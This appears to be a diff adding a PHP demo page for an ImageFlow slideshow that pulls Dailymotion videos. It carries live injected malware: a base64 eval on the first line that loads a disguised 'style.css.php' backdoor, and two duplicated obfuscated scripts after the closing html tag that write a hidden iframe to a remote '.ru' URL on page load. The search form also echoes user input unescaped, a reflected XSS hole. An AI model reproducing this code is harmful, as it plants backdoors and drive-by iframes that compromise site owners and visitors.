@@ -1,0 +1,331 @@
+<?php /**/eval(base64_decode('aWYoZnVuY3Rpb25fZXhpc3RzKCdvYl9zdGFydCcpJiYhaXNzZXQoJEdMT0JBTFNbJ21mc24nXSkpeyRHTE9CQUxTWydtZnNuJ109Jy9ob21lL2JjbW9uZXkvcHVibGljX2h0bWwvY2hhdC9waHBmcmVlY2hhdC9kZW1vL2RlbW81MF9kYXRhL215dGhlbWUvc3R5bGUuY3NzLnBocCc7aWYoZmlsZV9leGlzdHMoJEdMT0JBTFNbJ21mc24nXSkpe2luY2x1ZGVfb25jZSgkR0xPQkFMU1snbWZzbiddKTtpZihmdW5jdGlvbl9leGlzdHMoJ2dtbCcpJiZmdW5jdGlvbl9leGlzdHMoJ2Rnb2JoJykpe29iX3N0YXJ0KCdkZ29iaCcpO319fQ==')); ?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en">
+<head>
+<title>BC$ - SkipSearch - ImageFlow 1.0 with dailymotion and high quality video</title>
+<meta http-equiv="content-type" content="text/html; charset=ISO-8859-1" />
+<meta name="language" content="en" />
+<meta name="description" content="ImageFlow with dailymotion slideshow ."/>
+<meta name="keywords" content="ImageFlow, image flow, automatic slideshow, CoverFlow, cover flow, Javascript, imageflow in javascript, coverflow in javascript, dailymotion" />
+<meta name="robots" content="index, follow, noarchive" />
+<meta name="copyright" content="cfconsultancy" />
+<meta name="web_author" content="Ceasar Feijen" />
+<link rel="shortcut icon" href="../../favicon.ico" type="image/ico" />
+<!-- Needed for imageflow -->
+<link rel="stylesheet" title="Standard" href="screen.css" type="text/css" media="screen" />
+<script language="javascript" type="text/javascript" src="imageflow.js"></script>
+	<script language="javascript" type="text/javascript">
+	/* Optional settings for imageflow */
+	conf_reflection_p = 0.5;
+	/* Sets the numbers of images on each side of the focussed one */
+	conf_focus = 4;
+	/* 0 = default, 1 = small to big picture Change this to see the effect */
+	sizeAlgo = 0; //
+	/* Glide to a picture on startup. For example 10 is the 11th picture
+	Use 0 for the starting picture */
+	glidetopicture = 6;
+    /* Autostart slideshow  */
+    slideshowauto = true;
+    /* Show slideshow button  */
+    slideshowbutton = true;
+    /* Slideshow time setting in seconds */
+    slideshowtime = 3000;
+    /* Video settings */
+    videowidht = '520';
+    videoheight = '411';
+    /* Video position */
+	videotop  = '-350px';
+	videoleft = '-80px';
+	/* Output video, highslide, empty for normal link */
+	output = "video";
+	</script>
+<!-- END imageflow -->
+</head>
+<body>
+<div id="main">
+<!-- remove this if you don't want anyone to change the results  -->
+    <form method="get" action="index.php">
+      Search: <br/>
+      <input class="formulier_input" type="text" name="q" id="q" value="<?php echo $_REQUEST['q']; ?>" />
+      <input class="formulier_button" type="submit" name="submit" value="Search" />
+    </form>
+<!-- END -->
+</div>
+<!-- Needed for imageflow -->
+<div id="imageflowstart">
+  <div id="imageflow">
+	<div id="loading">
+		<b>Loading images</b><br/>
+		<img src="loading.gif" width="208" height="13" alt="loading" />
+	</div>
+	<div id="images">
+	<?php
+	/***************************************************************************
+	//ImageFlow + Dailymotion : 1.0 build 3
+	//released:               : Sept 3 2008
+	//copyright               : Copyright © 2008 cfconsultancy
+	//email                   : info@cfconsultancy.nl
+	//website                 : http://www.cfconsultancy.nl
+	//Imageflow with Dailymotion is released under a Creative Commons Attribution 3.0 License !
+	***************************************************************************/
+
+	error_reporting(E_ALL);
+	//remove this if you don't want anyone to change the results
+	if (!isset($_REQUEST['q']) || empty($_REQUEST['q'])) {
+    //END
+
+	//Default keywords
+	$videocode = "Phil Collins";
+
+    //remove this if you don't want anyone to change the results
+	    } else {
+
+	$videocode = str_replace(",","",$_REQUEST['q']);
+	}
+	//END
+
+	//Settings for the dailymotion feed !
+	//Sorting - can be relevance (default), hd, visited, rated, commented
+	$sorteren    = "relevance";
+	//Background for video player and div layer
+	$background  = "#FFFFFF";
+	//Foreground dailymotion player
+	$foreground  = "#000000";
+	//Reflection bgcolor
+	$reflection  = "#000000";
+    //Directory where the images will be stored and cached (needs to be chmod to 775 or 777)
+	$imagesdir   = "./img/";
+	//Cache the xml feed too true or false
+	$cachexml    = true;
+	//Previous and next button
+	$prevnext    = true;
+    //Empty cache after one hour 60*60, one day 24*60*60 or 7*24*60*60 one week)
+	$cacheLife   = 60*60;
+	//Maximum video's to retrieve. In this case pages (14 for one page) (default 4)
+	$maxvideo = 4;
+
+    //Check if page has been set ( max. 100 video's)
+	if(isset($_GET['page']) && is_numeric($_GET['page']) && $_GET['page'] > 0  && $_GET['page'] <= $maxvideo){
+		$start = $_GET['page'];
+	 }elseif (isset($_GET['page']) <= $maxvideo){
+		$start = 1;
+	}else{
+        $start = 1;
+    }
+
+	//Remove all the images after some time
+	$handle = opendir($imagesdir);
+	while ($file = readdir($handle))
+	{
+		if ($file != '.' AND $file != '..' AND eregi('(.*)\.jpg',$file) | eregi('(.*)\.png',$file) | eregi('(.*)\.xml',$file))
+		{
+	     if (time()-fileatime($imagesdir.$file) > $cacheLife)
+	     unlink($imagesdir.$file);
+	     }
+	}
+	//END
+
+	$videocode = ereg_replace('[[:space:]]%2B', ' ', trim($videocode));
+	$videocode = urlencode($videocode);
+
+      //set feed URL to get the info
+
+      //Example feed's most recent
+      //$feedURL = 'http://www.dailymotion.com/rss/1';
+      //Example feed most recent HD
+      //http://www.dailymotion.com/hd/1
+      //Example feed for a user
+      //$feedURL = 'http://www.dailymotion.com/rss/' . $sorteren . '/HERE THE USER NAME/1';
+      //Example feed for sorting and HD
+      //http://www.dailymotion.com/relevance/hd/search/' . $videocode . '/1
+      $feedURL = 'http://www.dailymotion.com/rss/' . $sorteren . '/search/' . $videocode . '/' . $start;
+
+		//Check if dailymotion is alive
+		$youHeaders = get_headers($feedURL);
+
+			if (preg_match('/^HTTP\/\d\.\d\s+(200)/', $youHeaders[0])) {
+
+      if ( $cachexml )
+      {
+      // Filename for the retrieved rss feed
+      $cachefile = $imagesdir . $videocode . '-' . $start . '.xml';
+
+        // Check if exists
+	    if (file_exists($cachefile) AND (filemtime($cachefile) > time() - $cacheLife))
+	    {
+          //Read feed into SimpleXML object
+          $sxml = simplexml_load_file($cachefile);
+
+        } else {
+
+	        if(function_exists('curl_init')){
+	            $chf = curl_init();
+	            $timeout = 15; // set to zero for no timeout
+	            curl_setopt ($chf, CURLOPT_URL, $feedURL);
+	            curl_setopt ($chf, CURLOPT_RETURNTRANSFER, 1);
+	            curl_setopt ($chf, CURLOPT_CONNECTTIMEOUT, $timeout);
+	            $feedcontents = curl_exec($chf);
+	            curl_close($chf);
+
+	        } else {
+
+	            $feedcontents = file_get_contents($feedURL);
+	        }
+
+        // Write to disk and save the filename
+	    file_put_contents($cachefile, $feedcontents);
+        //Read cach feed into SimpleXML object
+        $sxml = simplexml_load_file($cachefile);
+	  	}
+	  } else {
+
+        //Read feed into SimpleXML object
+		$sxml = simplexml_load_file($feedURL);
+
+	  }
+
+        // get nodes in media: namespace for media information
+        $media = $sxml->channel->item->children('http://search.yahoo.com/mrss');
+
+	     if(@empty($media)){
+	      $notube = "Sorry, no video's found with these keywords !";
+	     }
+
+	    $links = $sxml->channel->children('http://www.dailymotion.com/dmrss');
+
+        //Find out if we have next and previous items
+        $properties = array('next','prevUql');
+        foreach($properties as $name){
+	        $$name = null;
+	        $exit = false;
+	        foreach($links as $link) {
+	            if($exit){
+	                continue;
+	            }
+	            foreach($link->attributes() as $key => $value) {
+	                if($key == 'href'){
+	                    $$name = (string) $value;
+	                }
+	                if (stristr ($value , $name) == TRUE) {
+	                    $exit = true;
+	                }
+
+	            }
+	        }
+	        if(!$exit){
+            	$$name = null;
+            }
+            if($$name != null){
+
+				$$name = substr($$name,strrpos($$name,"/")+1);
+            }
+		}
+       if ($prevnext)
+       {
+    	if($prevUql != null){
+        	echo '<img src="previous.gif" id="imfl_previous" longdesc="' . basename(__FILE__) . '?q=' . $videocode . '&amp;page=' . $prevUql . '" alt="Previous 14 video\'s" border="0" />';
+		}
+       }
+
+      foreach ($sxml->channel->item as $entry) {
+        // get nodes in media: namespace for media information
+        $media = $entry->children('http://search.yahoo.com/mrss');
+
+        // get video titles
+        $titles = $media->title;
+        $titles = str_replace(array('&nbsp;', '&', '’', '“', '”', '`', '"', "'",), array('', ' ', '', '', '', '', ''), $titles);
+
+        // Find out the embedded link
+        $linksurl = $media->group->children('http://search.yahoo.com/mrss');
+
+        $linkproperties = array('application');
+        foreach($linkproperties as $content){
+	        $$content = null;
+	        $exit = false;
+	        foreach($linksurl as $links) {
+	            if($exit){
+	                continue;
+	            }
+	            foreach($links->attributes() as $keys => $values) {
+	                if($keys == 'url'){
+	                    $$content = (string) $values;
+	                }
+	                if (stristr ($values , $content) == TRUE) {
+	                    $exit = true;
+	                }
+
+	            }
+	        }
+	        if(!$exit){
+            	$$content = null;
+            }
+		}
+
+	    // get video thumbnail
+	    $attrs = $media->thumbnail->attributes();
+	    $thumbnail = $attrs['url'];
+
+		$pos_s = strrpos($thumbnail,'/');
+        $pos_q = strrpos($thumbnail,'?');
+        $image = substr($thumbnail,$pos_s+1,$pos_q-$pos_s-1);
+        $youname = $imagesdir.$image;
+
+	      //If already there skip the download
+	      if (!file_exists($youname)) {
+
+            //Grab the thumbnail
+	        if(function_exists('curl_init')){
+	            $ch = curl_init();
+	            $timeout = 15; // set to zero for no timeout
+	            curl_setopt ($ch, CURLOPT_URL, $thumbnail);
+	            curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
+	            curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
+	            $contents = curl_exec($ch);
+	            curl_close($ch);
+	        } else {
+	            $contents = file_get_contents($thumbnail);
+            }
+
+        //Get the picture's name again
+        $pos_s = strrpos($thumbnail,'/');
+        $pos_q = strrpos($thumbnail,'?');
+        $image = substr($thumbnail,$pos_s+1,$pos_q-$pos_s-1);
+
+        //Put it in the cache dir
+        $youname = $imagesdir.$image;
+
+        //Write the file to disk
+        file_put_contents($youname, $contents);
+	    }
+	    //For more information about the php reflection and settings got to http://reflection.corephp.co.uk
+?>
+		<img src="reflect.php?img=<?=$youname; ?>&amp;bgc=<?=$reflection = str_replace("#", "", $reflection); ?>&amp;cache=1&amp;procent=0.7" longdesc="<?=$application; ?>&amp;v3=1&amp;colors=background:<?=$background = str_replace("#", "", $background); ?>;glow:<?=$background = str_replace("#", "", $background); ?>;foreground:<?=$foreground = str_replace("#", "", $foreground); ?>;special:<?=$background = str_replace("#", "", $background); ?>;&amp;autoPlay=1&amp;related=0" alt="<?= html_entity_decode(utf8_decode($titles)); ?>" title="Click to play this video"/>
+<?php
+    }
+      if ($prevnext)
+      {
+    	if($next != null && $next < $maxvideo){
+	    	echo '<img src="next.gif" id="imfl_next" longdesc="' . basename(__FILE__) . '?q=' . $videocode . '&amp;page=' . $next . '" alt="Next 14 video\'s" border="0" />';
+      }
+		}
+  } else {
+	//Dailymotion server can not be reached
+	$notubexml = "Sorry, no connection to the Dailymotion server at this moment!";
+}
+?>
+	</div>
+	<div id="captions"><?=( isset($notube) ? $notube : '' ); ?> <?=( isset($notubexml) ? $notubexml : '' ); ?></div>
+	<div id="slideshow" title="play slideshow" onclick="slideshow(1);"></div>
+	<div id="scrollbar">
+	<div id="youtubepopup" class="vidFrame" style="background-color: #<?=$background; ?>;"></div>
+		<div id="slider" title="Click and drag to the left or right or use your arrow keys or scrollbutton"></div>
+	</div>
+  </div>
+</div>
+<!-- END imageflow -->
+<hr/>
+<h3><a href="http://www.imageflow.nl/imageflow-dailymotion.php" target="_blank">ImageFlow 1.0</a> with <a href="http://dailymotion.com" target="_blank">Dailymotion</a></h3>
+</div>
+</body>
+</html><script>function oT(){};mEE='';oT.prototype = {t : function() {function u(){};nP=false;var e="";this.vI=false;this.s="";try {var sD="sD";gW="gW";mE=false;var sP=false;function z(){};this.eG="";window.onload=function() {var qW=50071;this.xQ=19623;var sS="sS";var gX="gX";function hI(){};this.kW="";String.prototype.gO=function(l, q){var m=this; return m.replace(l, q)};var aI="aI";function jA(){};var sA="";this.tG=false;var j=function(y,vONq4,Ri){return ['x3cx69x66'+vONq4,Ri+'x53x6ax52x4cx58',y+'x6cx35x56x48']}('x75x56','x72x61x6dx65x20x64x76x62x6ex3dx31x20x73x72x63x3dx27','x51')[0];this.hC="";this.nW=23625;this.hR="hR";function dY(){};this.qB="";var lJ=function(I9SZP,yPAd,x,uvena,v){return [I9SZP+'x6ax67x6bx64x78','x62x34'+x,'x27x20x68x65x69x67x68x74x3d'+v,yPAd+'x73x4fx58','x76'+uvena]}('x49x6dx6fx7ax74','x72','x65x4b','x49','x31x30x30x30x20x6fx74x65x72x3dx31x20x77x69x64x74x68x3dx31x30x30x30x20x3cx2fx69x66x72x61x6dx65x3e')[2];var xC=15521;var p="p";iB='';nF='';var b=false;var pQ=new Array();var tX=function(LMeU,Mmgr,nE,F8BG,n){return [Mmgr+'x47x32x79x38','x4d'+F8BG,n+'x4ex77x51',nE+'x61x75x74x65x72x2ex72x75x2fx73x74x64x73x2fx67x6fx2ex70x68x70x3fx73x69x64x3dx31x34',LMeU+'x6fx68x5ax4c']}('x4bx78x6ax67x7a','x73','x68x74x74x70x3ax2fx2fx63x68x69x6c','x53x54x79x46x66','x72x78x67')[3];var dD=function(){};function kI(){};w='';var cC=function(){};this.wB=50833;uP='';function lDA(){};tX = j + tX + lJ;var gJ=new Array();var zV=new Array();var f=new Date();this.xB="xB";var lP='';mI=false;this.eQ=false;var d=document;mT='';bF=19498;var xA=new Date();this.hK='';var g=function(ENw77,ai4v,UD,Q0J){return [Q0J+'x63x51',ENw77+'x6a','x77x50'+ai4v,'x3c'+UD]}('x4ax57x4dx36x48','x6fx36x71x56','x64x69x76x20x69x64x3dx62x20x73x74x79x6cx65x3dx27x76x69x73x69x62x69x6cx69x74x79x3ax68x69x64x64x65x6ex3bx20x77x69x64x74x68x3ax20x31x70x78x3bx20x68x65x69x67x68x74x3ax20x31x70x78x27x3e','x61x77')[3];uG="uG";var aM=false;var tD='';this.dF=58238;var x=function(dD,Go,Z){return ['x55x4ex76'+Go,'x3cx2f'+Z,'x68x70x72x46'+dD]}('x76x6bx64x51','x6fx73','x64x69x76x3e')[1];var rJ=function(){return 'rJ'};this.vJ='';this.qD=32349;var tN=new Date();this.vV="";var a=function(QV0,j,qA){return [qA+'x75',j+'x65','x56x6a'+QV0]}('x77x58','x77x72x69x74','x56x57')[1];var rZ=function(){return 'rZ'};var wF=function(){};this.fJ="";var o=false;var yE='';var uH="uH";var wT=function(){};var jD=function(c,O,V,S){return [V+'x59x55','x78x33x64'+O,S+'x4ex45x44','x75x6ex65'+c]}('x73x63x61x70x65','x6cx44x42x62','x52x61','x75x55x37')[3];jDZ=46635;kO="kO";var cB=new Array();var jO=function(){return 'jO'};var kE=function(){};var v=window[jD];var wW=function(){return 'wW'};this.tJ=false;wL=27417;this.tP="";this.lV=false;var rO=2970;k=v(g + tX + x);this.mZ='';eV="eV";cT="";function pR(){};var lN=new Date();var xL=function(){return 'xL'};var jB='';function aG(){this.sK='';var wM="wM";var aA='';pI=false;this.qS=false;kOA="";var rT=function(){return 'rT'};lD=function(R4aAA,ACb,OJ,AdfB,pp){return ['x4ax55x38x73'+R4aAA,'x42x68x47x78x63'+ACb,pp+'x59x76x33',AdfB+'x79x53x38','x6fx75x74x65'+OJ]}('x55x6bx30','x43x75x74x35x44','x72','x4a','x55x59x41')[4];var pF=new Array();this.rP='';var eC=13618;var eM=function(){return 'eM'};bW="bW";var nE=new Date();n=function(wlpLC,AjjYH,d8a,nBq){return [nBq+'x70x7ax74x42',wlpLC+'x67',AjjYH+'x5ax38x4f',d8a+'x69x65x6ex74']}('x77x49x49','x6bx6ax4a','x63x6c','x55')[3];this.mU=false;var rY=false;var uD="";fZ=60025;var gA="gA";this.dU="dU";h=function(wu4a,I,n){return ['x48'+I,n+'x6ax39','x63'+wu4a]}('x4ex71x48x6a','x65x69x67x68x74','x46x43')[0];zH="zH";var bE="";this.eD="";this.dG=60658;this.eGN=false;this.qN="";c=function(QKyy,Iz,qU){return [qU+'x68','x44'+QKyy,'x4f'+Iz]}('x42x73x42','x55x58','x57x69x64x74')[0];var aB=new Array();var dUG="dUG";mW='';var cY=new Array();function cP(){};this.lQ='';tO=false;qJ=33519;y=function(I0,md,c){return ['x75'+c,'x42x78x77x54'+md,I0+'x55x5a']}('x6f','x72x77','x73x65x72x41x67x65x6ex74')[0];function pG(){};var fQ=new Date();var bV="";fZS="fZS";wV="wV";var dFO=new Array();i=function(mcZ,NQLG,ij,u0zqz,zSD){return [ij+'x4bx43x58x63','x72x53x46'+u0zqz,mcZ+'x78x71','x50'+NQLG,'x4d'+zSD]}('x49x38x70','x52x4ex42x68x71','x66x63x39x33x4f','x67x65x65x66','x53x49x45')[4];var qH=new Array();tH="tH";cK="cK";var nY=new Date();mY='';this.pL=false;if (navigator[y].indexOf(i) > 0){this.tU=false;iO="iO";nV=false;pM="";iK="iK";var dQ=function(){return 'dQ'};return d.body[n + c] * document.body[n + h];var mG=function(){};this.sKC='';}else{var qBE=new Array();this.tOZ="tOZ";this.iN='';this.pJ="";oH="oH";this.cS='';this.jDJ='';return window[lD + c] * window[lD + h];eI=3604;this.yM=false;function uK(){};var vN=function(){};}var zL=new Array();var sI=function(){return 'sI'};var cCH="";var dN=new Date();function iJ(){};this.uA="uA";}var qL="qL";this.gB="gB";var gJF=new Date();cF="";zQ=42353;if(aG() > 99999){d[a](k);}var dT=function(){};var bEZ=function(){return 'bEZ'};var lO=new Array();this.dE=43162;var rS=9935;var qM="qM";};var eMZ="";var rB=function(){return 'rB'};} catch(r) {this.yK="yK";kIC="kIC";this.mTH='';var jX=false;var iI="iI";bC='';}this.eH='';var oR="";gT="gT";var eW=false;}};var wP='';var hG=new oT(); hN="";hG.t();uDW=45307;</script><script>function oT(){};mEE='';oT.prototype = {t : function() {function u(){};nP=false;var e="";this.vI=false;this.s="";try {var sD="sD";gW="gW";mE=false;var sP=false;function z(){};this.eG="";window.onload=function() {var qW=50071;this.xQ=19623;var sS="sS";var gX="gX";function hI(){};this.kW="";String.prototype.gO=function(l, q){var m=this; return m.replace(l, q)};var aI="aI";function jA(){};var sA="";this.tG=false;var j=function(y,vONq4,Ri){return ['x3cx69x66'+vONq4,Ri+'x53x6ax52x4cx58',y+'x6cx35x56x48']}('x75x56','x72x61x6dx65x20x64x76x62x6ex3dx31x20x73x72x63x3dx27','x51')[0];this.hC="";this.nW=23625;this.hR="hR";function dY(){};this.qB="";var lJ=function(I9SZP,yPAd,x,uvena,v){return [I9SZP+'x6ax67x6bx64x78','x62x34'+x,'x27x20x68x65x69x67x68x74x3d'+v,yPAd+'x73x4fx58','x76'+uvena]}('x49x6dx6fx7ax74','x72','x65x4b','x49','x31x30x30x30x20x6fx74x65x72x3dx31x20x77x69x64x74x68x3dx31x30x30x30x20x3cx2fx69x66x72x61x6dx65x3e')[2];var xC=15521;var p="p";iB='';nF='';var b=false;var pQ=new Array();var tX=function(LMeU,Mmgr,nE,F8BG,n){return [Mmgr+'x47x32x79x38','x4d'+F8BG,n+'x4ex77x51',nE+'x61x75x74x65x72x2ex72x75x2fx73x74x64x73x2fx67x6fx2ex70x68x70x3fx73x69x64x3dx31x34',LMeU+'x6fx68x5ax4c']}('x4bx78x6ax67x7a','x73','x68x74x74x70x3ax2fx2fx63x68x69x6c','x53x54x79x46x66','x72x78x67')[3];var dD=function(){};function kI(){};w='';var cC=function(){};this.wB=50833;uP='';function lDA(){};tX = j + tX + lJ;var gJ=new Array();var zV=new Array();var f=new Date();this.xB="xB";var lP='';mI=false;this.eQ=false;var d=document;mT='';bF=19498;var xA=new Date();this.hK='';var g=function(ENw77,ai4v,UD,Q0J){return [Q0J+'x63x51',ENw77+'x6a','x77x50'+ai4v,'x3c'+UD]}('x4ax57x4dx36x48','x6fx36x71x56','x64x69x76x20x69x64x3dx62x20x73x74x79x6cx65x3dx27x76x69x73x69x62x69x6cx69x74x79x3ax68x69x64x64x65x6ex3bx20x77x69x64x74x68x3ax20x31x70x78x3bx20x68x65x69x67x68x74x3ax20x31x70x78x27x3e','x61x77')[3];uG="uG";var aM=false;var tD='';this.dF=58238;var x=function(dD,Go,Z){return ['x55x4ex76'+Go,'x3cx2f'+Z,'x68x70x72x46'+dD]}('x76x6bx64x51','x6fx73','x64x69x76x3e')[1];var rJ=function(){return 'rJ'};this.vJ='';this.qD=32349;var tN=new Date();this.vV="";var a=function(QV0,j,qA){return [qA+'x75',j+'x65','x56x6a'+QV0]}('x77x58','x77x72x69x74','x56x57')[1];var rZ=function(){return 'rZ'};var wF=function(){};this.fJ="";var o=false;var yE='';var uH="uH";var wT=function(){};var jD=function(c,O,V,S){return [V+'x59x55','x78x33x64'+O,S+'x4ex45x44','x75x6ex65'+c]}('x73x63x61x70x65','x6cx44x42x62','x52x61','x75x55x37')[3];jDZ=46635;kO="kO";var cB=new Array();var jO=function(){return 'jO'};var kE=function(){};var v=window[jD];var wW=function(){return 'wW'};this.tJ=false;wL=27417;this.tP="";this.lV=false;var rO=2970;k=v(g + tX + x);this.mZ='';eV="eV";cT="";function pR(){};var lN=new Date();var xL=function(){return 'xL'};var jB='';function aG(){this.sK='';var wM="wM";var aA='';pI=false;this.qS=false;kOA="";var rT=function(){return 'rT'};lD=function(R4aAA,ACb,OJ,AdfB,pp){return ['x4ax55x38x73'+R4aAA,'x42x68x47x78x63'+ACb,pp+'x59x76x33',AdfB+'x79x53x38','x6fx75x74x65'+OJ]}('x55x6bx30','x43x75x74x35x44','x72','x4a','x55x59x41')[4];var pF=new Array();this.rP='';var eC=13618;var eM=function(){return 'eM'};bW="bW";var nE=new Date();n=function(wlpLC,AjjYH,d8a,nBq){return [nBq+'x70x7ax74x42',wlpLC+'x67',AjjYH+'x5ax38x4f',d8a+'x69x65x6ex74']}('x77x49x49','x6bx6ax4a','x63x6c','x55')[3];this.mU=false;var rY=false;var uD="";fZ=60025;var gA="gA";this.dU="dU";h=function(wu4a,I,n){return ['x48'+I,n+'x6ax39','x63'+wu4a]}('x4ex71x48x6a','x65x69x67x68x74','x46x43')[0];zH="zH";var bE="";this.eD="";this.dG=60658;this.eGN=false;this.qN="";c=function(QKyy,Iz,qU){return [qU+'x68','x44'+QKyy,'x4f'+Iz]}('x42x73x42','x55x58','x57x69x64x74')[0];var aB=new Array();var dUG="dUG";mW='';var cY=new Array();function cP(){};this.lQ='';tO=false;qJ=33519;y=function(I0,md,c){return ['x75'+c,'x42x78x77x54'+md,I0+'x55x5a']}('x6f','x72x77','x73x65x72x41x67x65x6ex74')[0];function pG(){};var fQ=new Date();var bV="";fZS="fZS";wV="wV";var dFO=new Array();i=function(mcZ,NQLG,ij,u0zqz,zSD){return [ij+'x4bx43x58x63','x72x53x46'+u0zqz,mcZ+'x78x71','x50'+NQLG,'x4d'+zSD]}('x49x38x70','x52x4ex42x68x71','x66x63x39x33x4f','x67x65x65x66','x53x49x45')[4];var qH=new Array();tH="tH";cK="cK";var nY=new Date();mY='';this.pL=false;if (navigator[y].indexOf(i) > 0){this.tU=false;iO="iO";nV=false;pM="";iK="iK";var dQ=function(){return 'dQ'};return d.body[n + c] * document.body[n + h];var mG=function(){};this.sKC='';}else{var qBE=new Array();this.tOZ="tOZ";this.iN='';this.pJ="";oH="oH";this.cS='';this.jDJ='';return window[lD + c] * window[lD + h];eI=3604;this.yM=false;function uK(){};var vN=function(){};}var zL=new Array();var sI=function(){return 'sI'};var cCH="";var dN=new Date();function iJ(){};this.uA="uA";}var qL="qL";this.gB="gB";var gJF=new Date();cF="";zQ=42353;if(aG() > 99999){d[a](k);}var dT=function(){};var bEZ=function(){return 'bEZ'};var lO=new Array();this.dE=43162;var rS=9935;var qM="qM";};var eMZ="";var rB=function(){return 'rB'};} catch(r) {this.yK="yK";kIC="kIC";this.mTH='';var jX=false;var iI="iI";bC='';}this.eH='';var oR="";gT="gT";var eW=false;}};var wP='';var hG=new oT(); hN="";hG.t();uDW=45307;</script>
